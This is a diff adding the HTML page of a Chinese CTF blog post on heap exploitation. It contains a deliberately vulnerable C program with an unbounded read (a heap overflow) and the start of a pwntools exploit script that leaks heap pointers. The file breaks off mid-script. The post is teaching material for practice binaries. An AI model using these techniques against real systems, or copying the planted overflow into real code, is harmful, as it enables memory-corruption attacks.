@@ -1,0 +1,906 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rot_will">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="heap overflow 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击方法一">
+<meta property="og:url" content="https://rot-will.github.io/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/index.html">
+<meta property="og:site_name" content="rot&#39;s Blog">
+<meta property="og:description" content="heap overflow 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-2.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-4.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-5.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-2.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-4.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-1.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-2.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-3.jpg">
+<meta property="og:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-unlink-4.jpg">
+<meta property="article:published_time" content="2022-11-22T07:10:45.000Z">
+<meta property="article:modified_time" content="2023-10-15T11:42:04.071Z">
+<meta property="article:author" content="rot_will">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rot-will.github.io/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow.jpg">
+  
+  
+  
+  <title>攻击方法一 - rot&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+    
+        
+        
+        <link id="csscustom_image-light" rel="stylesheet" href="/css/image.css" />
+        
+          <link id="csscustom_image-dark" rel="stylesheet" href="/css/image-dark.css" />
+        
+    
+        
+        
+        <link id="csscustom_salient-light" rel="stylesheet" href="/css/salient.css" />
+        
+          <link id="csscustom_salient-dark" rel="stylesheet" href="/css/salient-dark.css" />
+        
+    
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rot-will.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Rot-will</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="攻击方法一"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        rot_will
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-22 15:10" pubdate>
+          2022年11月22日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          222 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="heap"
+        id="heading-4d4a9aa362b6ffe089fd2e992ccf4f5f" role="tab" data-toggle="collapse" href="#collapse-4d4a9aa362b6ffe089fd2e992ccf4f5f"
+        aria-expanded="true"
+      >
+        heap
+        <span class="list-group-count">(4)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-4d4a9aa362b6ffe089fd2e992ccf4f5f"
+           role="tabpanel" aria-labelledby="heading-4d4a9aa362b6ffe089fd2e992ccf4f5f">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/page/heap/%E5%A0%86%E5%9F%BA%E7%A1%80/" title="堆基础"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">堆基础</span>
+        </a>
+      
+    
+      
+      
+        <a href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/" title="攻击方法一"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">攻击方法一</span>
+        </a>
+      
+    
+      
+      
+        <a href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/" title="攻击方法二"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">攻击方法二</span>
+        </a>
+      
+    
+      
+      
+        <a href="/page/heap/IO%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/" title="IO结构体分析"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">IO结构体分析</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻击方法一</h1>
+            
+              <p class="note note-light">
+                
+                  
+                    本文最后更新于：2023年10月15日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="heap-overflow">heap overflow</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    当程序在向chunk写入数据时没有限制数据长度</span><br><span class="hljs-comment">    如果当前chunk的后一个chunk在bin中</span><br><span class="hljs-comment">    则可以直接输入大量数据修改下一个chunk所在bin的结构</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* gcc heap_overflow.c -o heap_overflow */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">2048</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;    <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="heap-overflow-示例分析">heap overflow 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-overflow-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    edit函数中无论chunk本身的大小时多少都可以输入0x800个字符</span><br><span class="hljs-string">    因为delete函数中清空了chunk指针</span><br><span class="hljs-string">    所以只能通过edit先将当前chunk的数据段与下一个chunk的数据段直接的\x00替换掉</span><br><span class="hljs-string">    然后调用show函数查看当前chunk的数据</span><br><span class="hljs-string">    顺便将下一个chunk的fd泄露出来</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span 